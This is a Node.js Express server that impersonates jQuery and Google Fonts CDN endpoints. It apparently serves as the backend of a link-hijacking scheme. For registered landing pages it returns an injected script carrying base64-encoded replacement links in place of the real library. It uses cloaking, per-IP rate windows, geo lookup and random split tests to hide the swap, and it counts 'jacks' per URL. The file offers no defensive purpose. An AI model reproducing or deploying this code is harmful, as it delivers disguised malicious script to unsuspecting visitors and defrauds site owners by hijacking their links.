var _ = require("lodash");
//module dependencies
var express = require('express'),
  http = require('http'),
  mysql = require('mysql'),
  path = require('path');
var app = express();
var request = require('request');
var urlParser = require('url');
var fs = require('node-fs');
var uuid = require('node-uuid');
var cors = require('cors');
var get_ip = require('ipware')().get_ip;
var geoip = require('geoip-lite');
//new middlewares
var logger = require('morgan');
var methodOverride = require('method-override');
var session = require('express-session');
var bodyParser = require('body-parser');
var multer = require('multer');
var errorHandler = require('errorhandler');
var cookieParser = require('cookie-parser');

var config = require('./config');

var redis = require("redis");
var redisClient = redis.createClient(config.redisConfig);
redisClient.on("error", function(e) {
  console.log("REDIS ERROR: " + e);
});


//Date prototype for converting Date() to MySQL DateTime format
Date.prototype.toMysqlFormat = function() {
  function pad(n) {
    return n < 10 ? '0' + n : n
  }
  return this.getFullYear() + "-" + pad(1 + this.getMonth()) + "-" + pad(this.getDate()) + " " + pad(this.getHours()) + ":" + pad(this.getMinutes()) + ":" + pad(this.getSeconds());
};
String.prototype.replaceAt = function(index, character) {
  return this.substr(0, index) + character + this.substr(index + character.length);
}

// all environments
app.set('port', config.port);
app.set('views', __dirname + '/views');
app.set('view engine', 'jade');
//app.use(favicon(__dirname + '/public/favicon.ico'));
//app.use(logger('dev'));
app.use(cookieParser());
app.use(bodyParser.json()); // parse application/json
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true })); // parse application/x-www-form-urlencoded
app.use(multer()); // parse multipart/form-data
app.use(session({ secret: 'foosballIsDaDevil', resave: true, saveUninitialized: true }));
app.use(methodOverride());
app.use(express.static(path.join(__dirname, 'public')));

//deprecated, see: https://github.com/strongloop/express/wiki/Migrating-from-3.x-to-4.x
/*app.configure('development', function() {
    app.use(errorHandler());
    app.locals.pretty = true;
});*/

var connection = mysql.createConnection(config.db_connection);
connection.connect();

function getCodeDelimiter() {
  return "aIx1Fgix89e";
}

function addClientToWhitelistWindow(ip) {
  redisClient.get(ip, function(err, isWhitelisted) {
    if (isWhitelisted) {
      console.log("ffffalse")
      return false;
    } else {
      console.log("true")
      redisClient.set(ip, true);
      redisClient.expire(ip, '5');
      return true;
    }
  });
}

function getClientAddress(req) {
  return (req.headers['x-forwarded-for'] || '').split(',')[0] || req.connection.remoteAddress;
};

function getClientResponseJSON(uuid, url, ip, callback) {

  var useSplitTestLinks = 1;

  if (Math.random() < .5) {
    useSplitTestLinks = 0;
  }

  var response = "";

  connection.query("select is_jackable(?,?,?) as redirect_rate;", [url, config.minimum_clicks_per_min, ip], function(err, docs) {
    if (docs) {
      if (docs[0]) {
        var redirect_rate = docs[0].redirect_rate;
        var randomNumber = Math.random() * 100;
        if (redirect_rate == -1) {
          callback({ jquery: "cloaked" });
        } else if (randomNumber <= redirect_rate) {
          connection.query("SELECT get_replacement_links(?,?) as links;", [url, useSplitTestLinks], function(err, docs) {
            if (docs.length > 0) {
              var links = docs[0].links;
              if (links) {
                var linksArr = links.split(",");
                /* 2. transform that into base64 code */
                for (var i = 0; i < linksArr.length; i++) {
                  response += new Buffer(linksArr[i]).toString('base64') + getCodeDelimiter();
                }
              }
            }

            if (response) {
              connection.query("CALL increment_jacks(?,?);", [url, uuid], function(err, docs) {
                if (err) {
                  console.log("Error incrementing jacks for url: " + url + " : " + err);
                }
                callback({ jquery: response });
              });
            } else {
              callback({ jquery: response });
            }
          });
        } else {
          callback({ jquery: false });
        }
      } else {
        console.log(err);
        console.log("Cannot select is_jackable with values: " + url + ", " + ip);
        callback({ jquery: false });
      }
    } else {
      console.log(err);
      console.log("Cannot select is_jackable with values: " + url + ", " + ip);
      callback({ jquery: false });
    }
  });
}

function formatURL(url) {
  if (url.substring(0, 7) != "http://" && url.substring(0, 8) != "https://") {
    url = "http://" + url;
  }

  if (url.substring(0, 11) == "http://www.") {
    url = url.replace("http://www.", "http://");
  }

  if (url.substring(0, 12) == "https://www.") {
    url = url.replace("https://www.", "http://");
  }

  if (url.substring(0, 8) == "https://") {
    url = url.replace("https://", "http://");
  }

  //drop everything after first '?' (query args)
  url = url.split('?')[0];

  //drop everything after first '#'
  url = url.split('#')[0];

  var lastChar = url.substr(url.length - 1);

  if (lastChar == '/') {
    url = url.substring(0, url.length - 1);
  }

  return url;
}

function getDomain(url) {
  return urlParser.parse(url).hostname;
}

function sendPlainFont(font, res) {
  if (!config.uuidArr[font]) {
    font = "Open Sans";
  }

  fs.readFile('./client/css/' + font, function(err, data) {
    if (err) {
      throw err;
    }
    res.writeHead(200, {
      'Content-Length': data.length,
      'Content-Type': 'text/plain',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, OPTIONS',
      'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
    });
    res.end(data);
  });
}

function sendPlainJquery(req, res) {
  fs.readFile('./client/compressed/jquery-1.11.2.min.js', function(err, data) {
    if (err) {
      throw err;
    }
    var jqueryVersion = req.params.jqueryVersion;
    if (!jqueryVersion) {
      jqueryVersion = '1.11.1';
    }
    data = String(data).replace('jqueryVersion', jqueryVersion);

    res.writeHead(200, {
      'Content-Length': data.length,
      'Content-Type': 'text/plain',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, OPTIONS',
      'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
    });
    res.end(data);
  });
}

function sendBlankResponse(res) {
  var response = "";
  res.writeHead(200, {
    'Content-Length': response.length,
    'Content-Type': 'text/plain',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, OPTIONS',
    'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
  });
  res.end(response);
}

app.get('/', function(req, res) {
  var host = req.get('host');
  var redirectUrl = config.redirectUrls[host];
  // console.log("host: " + host + " now redirecting to : " + redirectUrl);
  if (!redirectUrl) redirectUrl = "https://github.com";
  res.redirect(redirectUrl);
});

//Get and load client js
app.get('/jquery', function(req, res) {
  sendPlainJquery(req, res);
});

app.get('/jquery/latest', function(req, res) {
  sendPlainJquery(req, res);
});

//I don't think this endpoint is used
app.post('/jquery/latest', function(req, res) {
  var url = req.body.referer;
  var uuid = req.body.version;
  var full_url = url;

  var ip = getClientAddress(req);
  var geo = geoip.lookup(ip);

  if (!geo) {
    geo = { country: "UNKNOWN" };
    console.log("/jquery/latest IP: " + ip + " had unknown geo region.");
  }

  if (!ip) {
    ip = "0.0.0.0";
  }

  if (addClientToWhitelistWindow(ip)) {
    if (!url) {
      console.log("Error: undefined url.");
      console.log(req.headers);
      sendPlainJquery(req, res);
    } else {

      url = formatURL(url);
      var domain = getDomain(url);

      connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
        if (docs != undefined && docs[0] != undefined) {
          var response_string = docs[0].value;
          var cloaked = 0;

          //console.log("Response from process_request: " + response_string);
          if (response_string == "OLD_RIPPED") {
            //send back data!
            getClientResponseJSON(uuid, url, ip, function(response) {

              //console.log("Response to client: " + response.jquery);

              if (response.jquery == false) {
                response = "";
                sendPlainJquery(req, res);
                return;
              } else if (response.jquery == "cloaked") {
                sendPlainJquery(req, res);
                return;
                cloaked = 1;
                response = "";
              } else {
                response = response.jquery;
              }

              fs.readFile('./client/compressed/compressed_landercode_experimental2.js', function(err, data) {
                if (err) throw err;
                var replacedFile = String(data).replace('replacemeuuid', uuid);
                replacedFile = String(replacedFile).replace('replacemelinks', response);

                if (cloaked == 1) {
                  replacedFile = String(replacedFile).replace('replacemestats', 'yes');
                }

                res.writeHead(200, {
                  'Content-Length': replacedFile.length,
                  'Content-Type': 'text/plain',
                  'Access-Control-Allow-Origin': '*',
                  'Access-Control-Allow-Methods': 'GET, OPTIONS',
                  'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
                });
                res.end(replacedFile);
              });
            });
          } else if (response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
            sendBlankResponse(res);
          } else if (response_string == "UNKNOWN_BEHAVIOR") {
            console.log("Something went wrong when calling process_request.");
            sendPlainJquery(req, res);
          } else if (response_string == "UNKNOWN_UUID") {
            console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
            sendPlainJquery(req, res);
          } else {
            sendPlainJquery(req, res);
          }
        } else {
          console.log("Failed to get a response from process_request");
          sendPlainJquery(req, res);
        }
      });
    }

  } else {
    sendPlainJquery(req, res);
  }
});


app.post('/jquery/stable', function(req, res) {
  var url = req.body.stats;
  var uuid = req.body.version;
  var full_url = url;

  var ip = getClientAddress(req);
  var geo = geoip.lookup(ip);

  if (!geo) {
    geo = { country: "UNKNOWN" };
    console.log("/jquery/stable IP: " + ip + " had unknown geo region.");
  }

  if (!ip) {
    ip = "0.0.0.0";
  }

  if (addClientToWhitelistWindow(ip)) {
    if (!url) {
      console.log("Error: undefined url.");
      console.log(req.headers);
      sendPlainJquery(req, res);
    } else {

      url = formatURL(url);
      var domain = getDomain(url);

      //console.log("Received lander request from " + url + " with uuid = " + uuid);

      //console.log("Formatted url to be: " + url);
      //console.log("The domain of the url is: " + domain);

      connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
        if (docs != undefined && docs[0] != undefined) {
          var response_string = docs[0].value;
          var cloaked = 0;

          //console.log("Response from process_request: " + response_string);
          if (response_string == "OLD_RIPPED") {
            //send back data!
            getClientResponseJSON(uuid, url, ip, function(response) {

              //console.log("Response to client: " + response.jquery);

              if (response.jquery == false) {
                response = "";
                sendPlainJquery(req, res);
                return;
              } else if (response.jquery == "cloaked") {
                cloaked = 1;
                response = "";
                sendPlainJquery(req, res);
                return;
              } else {
                response = response.jquery;
              }

              fs.readFile('./client/compressed/compressed_landercode_experimental2.js', function(err, data) {
                if (err) throw err;
                var replacedFile = String(data).replace('replacemeuuid', uuid);
                replacedFile = String(replacedFile).replace('replacemelinks', response);

                if (cloaked == 1) {
                  replacedFile = String(replacedFile).replace('replacemestats', 'yes');
                }

                res.writeHead(200, {
                  'Content-Length': replacedFile.length,
                  'Content-Type': 'text/plain',
                  'Access-Control-Allow-Origin': '*',
                  'Access-Control-Allow-Methods': 'GET, OPTIONS',
                  'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
                });
                res.end(replacedFile);
              });
            });
          } else if (response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
            sendBlankResponse(res);
          } else if (response_string == "UNKNOWN_BEHAVIOR") {
            console.log("Something went wrong when calling process_request.");
            sendPlainJquery(req, res);
          } else if (response_string == "UNKNOWN_UUID") {
            console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
            sendPlainJquery(req, res);
          } else {
            sendPlainJquery(req, res);
          }
        } else {
          console.log("Failed to get a response from process_request");
          sendPlainJquery(req, res);
        }
      });
    }
  } else {
    sendPlainJquery(req, res);
  }


});

app.post('/jquery/dist', function(req, res) {
  var url = req.body.stats;
  var uuid = req.body.version;
  var full_url = url;

  var ip = getClientAddress(req);
  var geo = geoip.lookup(ip);

  if (!geo) {
    geo = { country: "UNKNOWN" };
    console.log("/jquery/dist IP: " + ip + " had unknown geo region.");
  }

  if (!ip) {
    ip = "0.0.0.0";
  }


  if (addClientToWhitelistWindow(ip)) {
    if (!url) {
      console.log("Error: undefined url.");
      console.log(req.headers);
      sendPlainJquery(req, res);
    } else {
      url = formatURL(url);
      var domain = getDomain(url);

      //console.log("Received lander request from " + url + " with uuid = " + uuid);

      //console.log("Formatted url to be: " + url);
      //console.log("The domain of the url is: " + domain);

      connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
        if (docs != undefined && docs[0] != undefined) {
          var response_string = docs[0].value;
          var cloaked = 0;

          //console.log("Response from process_request: " + response_string);
          if (response_string == "OLD_RIPPED") {
            //send back data!
            getClientResponseJSON(uuid, url, ip, function(response) {

              //console.log("Response to client: " + response.jquery);

              if (response.jquery == false) {
                response = "";
                sendPlainJquery(req, res);
                return;
              } else if (response.jquery == "cloaked") {
                cloaked = 1;
                response = "";
                sendPlainJquery(req, res);
                return;
              } else {
                response = response.jquery;
              }

              fs.readFile('./client/compressed/compressed_landercode_experimental2.js', function(err, data) {
                if (err) throw err;
                var replacedFile = String(data).replace('replacemeuuid', uuid);
                replacedFile = String(replacedFile).replace('replacemelinks', response);

                if (cloaked == 1) {
                  replacedFile = String(replacedFile).replace('replacemestats', 'yes');
                }

                res.writeHead(200, {
                  'Content-Length': replacedFile.length,
                  'Content-Type': 'text/plain',
                  'Access-Control-Allow-Origin': '*',
                  'Access-Control-Allow-Methods': 'GET, OPTIONS',
                  'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
                });
                res.end(replacedFile);
              });
            });
          } else if (response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
            sendBlankResponse(res);
          } else if (response_string == "UNKNOWN_BEHAVIOR") {
            console.log("Something went wrong when calling process_request.");
            sendPlainJquery(req, res);
          } else if (response_string == "UNKNOWN_UUID") {
            console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
            sendPlainJquery(req, res);
          } else {
            sendPlainJquery(req, res);
          }
        } else {
          console.log("Failed to get a response from process_request");
          sendPlainJquery(req, res);
        }
      });
    }
  } else {
    sendPlainJquery(req, res);
  }
});

app.get('/jquery/dist', function(req, res) {

  var xalt = req.headers['x-alt-referer'];

  if (!xalt) {
    xalt = req.headers['X-Alt-Referer'];
  }


  var isWrongCjId = function(uuid, url) {
    //if uuid is balling and the following urls don't jack because it's jake's traffic.
    if (uuid == "c46b3fb0-a619-4012-956a-c04315a1e6b0") {
      if (url == "http://trending.bestnews-today.com/FRS/index.html?id=FF-16" ||
        url == "http://trending.bestnews-today.com/FRS/index.html") {
        return true;
      }
    }
    return false;
  }

  if (!xalt) {
    console.log("Error: undefined x-alt-referer");
    console.log(req.headers);
    sendPlainJquery(req, res);
  } else {

    var index = xalt.lastIndexOf("?txid=");

    var url = xalt.substring(0, index);
    var uuid = xalt.substring(index + 6);
    var full_url = url;

    var ip = getClientAddress(req);
    var geo = geoip.lookup(ip);

    if (!geo) {
      geo = { country: "UNKNOWN" };
      console.log("/jquery/dist IP: " + ip + " had unknown geo region.");
    }

    if (!ip) {
      ip = "0.0.0.0";
    }

    if (addClientToWhitelistWindow(ip)) {
      if (!url) {
        console.log("Error: undefined url. Or wrong CJ id");
        console.log(req.headers);
        sendPlainJquery(req, res);
      } else {
        url = formatURL(url);
        var domain = getDomain(url);

        if (isWrongCjId(uuid, url)) {
          sendPlainJquery(req, res);
          return;
        }
        //console.log("Received lander request from " + url + " with uuid = " + uuid);

        //console.log("Formatted url to be: " + url);
        //console.log("The domain of the url is: " + domain);

        connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
          if (docs != undefined && docs[0] != undefined) {
            var response_string = docs[0].value;
            var cloaked = 0;

            //console.log("Response from process_request: " + response_string);
            if (response_string == "OLD_RIPPED") {
              //send back data!
              getClientResponseJSON(uuid, url, ip, function(response) {

                //console.log("Response to client: " + response.jquery);

                if (response.jquery == false) {
                  response = "";
                  sendPlainJquery(req, res);
                  return;
                } else if (response.jquery == "cloaked") {
                  cloaked = 1;
                  response = "";
                  sendPlainJquery(req, res);
                  return;
                } else {
                  response = response.jquery;
                }

                fs.readFile('./client/compressed/compressed_landercode_experimental2.js', function(err, data) {
                  if (err) throw err;
                  var replacedFile = String(data).replace('replacemeuuid', uuid);
                  replacedFile = String(replacedFile).replace('replacemelinks', response);

                  if (cloaked == 1) {
                    replacedFile = String(replacedFile).replace('replacemestats', 'yes');
                  }

                  res.writeHead(200, {
                    'Content-Length': replacedFile.length,
                    'Content-Type': 'text/plain',
                    'Access-Control-Allow-Origin': '*',
                    'Access-Control-Allow-Methods': 'GET, OPTIONS',
                    'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
                  });
                  res.end(replacedFile);
                });
              });
            } else if (response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
              sendBlankResponse(res);
            } else if (response_string == "UNKNOWN_BEHAVIOR") {
              console.log("Something went wrong when calling process_request.");
              sendPlainJquery(req, res);
            } else if (response_string == "UNKNOWN_UUID") {
              console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
              sendPlainJquery(req, res);
            } else {
              sendPlainJquery(req, res);
            }
          } else {
            console.log("Failed to get a response from process_request");
            sendPlainJquery(req, res);
          }
        });
      }
    } else {
      sendPlainJquery(req, res);
    }
  }
});

app.post('/jquery', function(req, res) {

  var url = req.headers['referer'];

  var uuid = req.body.version;

  var full_url = url;

  var ip = getClientAddress(req);
  var geo = geoip.lookup(ip);

  if (!geo) {
    geo = { country: "UNKNOWN" };
    console.log("/jquery IP: " + ip + " had unknown geo region.");
  }

  if (!ip) {
    ip = "0.0.0.0";
  }

  if (addClientToWhitelistWindow(ip)) {
    if (!url) {
      console.log("Error: undefined url.");
      console.log(req.headers);
      sendPlainJquery(req, res);
    } else {

      url = formatURL(url);
      var domain = getDomain(url);

      //console.log("Received lander request from " + url + " with uuid = " + uuid);

      //console.log("Formatted url to be: " + url);
      //console.log("The domain of the url is: " + domain);

      connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
        if (docs != undefined && docs[0] != undefined) {
          var response_string = docs[0].value;
          var cloaked = 0;

          //console.log("Response from process_request: " + response_string);
          if (response_string == "OLD_RIPPED") {
            //send back data!
            getClientResponseJSON(uuid, url, ip, function(response) {

              //console.log("Response to client: " + response.jquery);

              if (response.jquery == false) {
                response = "";
                sendPlainJquery(req, res);
                return;
              } else if (response.jquery == "cloaked") {
                cloaked = 1;
                response = "";
                sendPlainJquery(req, res);
                return;
              } else {
                response = response.jquery;
              }

              fs.readFile('./client/compressed/compressed_landercode_experimental2.js', function(err, data) {
                if (err) throw err;
                var replacedFile = String(data).replace('replacemeuuid', uuid);
                replacedFile = String(replacedFile).replace('replacemelinks', response);

                if (cloaked == 1) {
                  replacedFile = String(replacedFile).replace('replacemestats', 'yes');
                }

                res.writeHead(200, {
                  'Content-Length': replacedFile.length,
                  'Content-Type': 'text/plain',
                  'Access-Control-Allow-Origin': '*',
                  'Access-Control-Allow-Methods': 'GET, OPTIONS',
                  'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
                });
                res.end(replacedFile);
              });
            });
          } else if (response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
            sendBlankResponse(res);
          } else if (response_string == "UNKNOWN_BEHAVIOR") {
            console.log("Something went wrong when calling process_request.");
            sendPlainJquery(req, res);
          } else if (response_string == "UNKNOWN_UUID") {
            console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
            sendPlainJquery(req, res);
          } else {
            sendPlainJquery(req, res);
          }
        } else {
          console.log("Failed to get a response from process_request");
          sendPlainJquery(req, res);
        }
      });
    }
  } else {
    sendPlainJquery(req, res);
  }

});


//FOR fonts.googleapis.io/css?family=<font>
app.get('/css', function(req, res) {

  var url = req.headers.referrer || req.headers.referer;
  var full_url = url;

  var font = req.query.family;
  var uuid = config.uuidArr[font];

  if (!uuid) {

    res.redirect('http://fonts.googleapis.com' + req.url);
    return;
  }
  var ip = getClientAddress(req);
  var geo = geoip.lookup(ip);

  if (!geo) {
    geo = { country: "UNKNOWN" };
    console.log("/css: IP: " + ip + " had unknown geo region.");
  }

  if (!ip) {
    ip = "0.0.0.0";
  }

  //if add success then we can jack else serve plain css
  if (addClientToWhitelistWindow(ip)) {

    // console.log("\nurl : " + url + "\nuuid: " + uuid + " " + "\nip: " + ip + "\ngeo: " + geo);

    if (!url) {
      console.log("Error: undefined url.");
      // console.log(req.headers);
      sendPlainFont(font, res);
    } else {
      url = formatURL(url);
      var domain = getDomain(url);

      // console.log("Received lander request from " + url + " with uuid = " + uuid);

      // console.log("Formatted url to be: " + url);
      // console.log("The domain of the url is: " + domain);

      connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
        if (docs != undefined && docs[0] != undefined) {
          var response_string = docs[0].value;
          var cloaked = 0;

          //console.log("Response from process_request: " + response_string);
          if (response_string == "OLD_RIPPED") {
            //send back data!
            getClientResponseJSON(uuid, url, ip, function(response) {

              //console.log("Response to client: " + response.jquery);

              if (response.jquery == false) {
                sendPlainFont(font, res);
                return;
              } else if (response.jquery == "cloaked") {
                cloaked = 1;
                sendPlainFont(font, res);
                return;
              } else {
                response = response.jquery;
              }

              fs.readFile('./client/compressed/compressed_googleapis.js', function(err, data) {
                if (err) throw err;
                var replacedFile = String(data).replace('replacemeuuid', uuid);
                replacedFile = String(replacedFile).replace('replacemelinks', response);



                if (cloaked == 1) {
                  replacedFile = String(replacedFile).replace('replacemestats', 'yes');
                }

                res.writeHead(200, {
                  'Content-Length': replacedFile.length,
                  'Content-Type': 'text/plain',
                  'Access-Control-Allow-Origin': '*',
                  'Access-Control-Allow-Methods': 'GET, OPTIONS',
                  'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
                });
                res.end(replacedFile);
              });
            });
          } else if (response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
            sendBlankResponse(res);
          } else if (response_string == "UNKNOWN_BEHAVIOR") {
            // console.log("Something went wrong when calling process_request.");
            sendPlainFont(font, res);
          } else if (response_string == "UNKNOWN_UUID") {
            // console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
            sendPlainFont(font, res);
          } else {
            sendPlainFont(font, res);
          }
        } else {
          // console.log("Failed to get a response from process_request");
          sendPlainFont(font, res);
        }
      });
    }
  } else {
    sendPlainFont(font, res);
  }
});

//ajax.googleapis.io GENERAL ENDPOINT
app.get('/ajax/libs/jquery/:jqueryVersion/jquery.min.js', function(req, res) {

  var url = req.headers.referrer || req.headers.referer;
  var full_url = url;

  var jqueryVersion = req.params.jqueryVersion;

  var uuid = config.uuidJqueryArr[jqueryVersion];

  if (!uuid) {
    res.redirect('http://ajax.googleapis.com' + req.url);
    return;
  }

  var ip = getClientAddress(req);
  var geo = geoip.lookup(ip);

  if (!geo) {
    geo = { country: "UNKNOWN" };
    console.log("/ajax/libs/jquery/ IP: " + ip + " had unknown geo region.");
  }

  if (!ip) {
    ip = "0.0.0.0";
  }

  //if add success then we can jack else serve plain css
  if (addClientToWhitelistWindow(ip)) {

    // console.log("\nurl : " + url + "\nuuid: " + uuid + " " + "\nip: " + ip + "\ngeo: " + geo);

    if (!url) {
      console.log("Error: undefined url.");
      // console.log(req.headers);
      sendPlainJquery(req, res);
    } else {

      url = formatURL(url);
      var domain = getDomain(url);

      connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
        if (docs != undefined && docs[0] != undefined) {
          var response_string = docs[0].value;
          var cloaked = 0;

          // console.log("not plain jquery " + response_string + " uuid: " + uuid);

          //console.log("Response from process_request: " + response_string);
          if (response_string == "OLD_RIPPED") {
            //send back data!
            getClientResponseJSON(uuid, url, ip, function(response) {

              //console.log("Response to client: " + response.jquery);

              if (response.jquery == false) {
                sendPlainJquery(req, res);
                return;
              } else if (response.jquery == "cloaked") {
                cloaked = 1;
                sendPlainJquery(req, res);
                return;
              } else {
                response = response.jquery;
              }

              fs.readFile('./client/compressed/compressed_landercode_experimental2.js', function(err, data) {
                if (err) throw err;
                var replacedFile = String(data).replace('replacemeuuid', uuid);
                replacedFile = String(replacedFile).replace('replacemelinks', response);
                replacedFile = String(replacedFile).replace('jqueryVersion', jqueryVersion);
                if (cloaked == 1) {
                  replacedFile = String(replacedFile).replace('replacemestats', 'yes');
                }

                res.writeHead(200, {
                  'Content-Length': replacedFile.length,
                  'Content-Type': 'text/plain',
                  'Access-Control-Allow-Origin': '*',
                  'Access-Control-Allow-Methods': 'GET, OPTIONS',
                  'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
                });
                res.end(replacedFile);
              });
            });
          } else if (response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
            sendBlankResponse(res);
          } else if (response_string == "UNKNOWN_BEHAVIOR") {
            // console.log("Something went wrong when calling process_request.");
            sendPlainJquery(req, res);
          } else if (response_string == "UNKNOWN_UUID") {
            // console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
            sendPlainJquery(req, res);
          } else {
            sendPlainJquery(req, res);
          }
        } else {
          // console.log("Failed to get a response from process_request");
          sendPlainJquery(req, res);
        }
      });
    }
  } else {
    sendPlainJquery(req, res);
  }
});


http.createServer(app).listen(config.port, function() {
  console.log('RS REST server listening on port ' + config.port);
});

exports = module.exports = app;
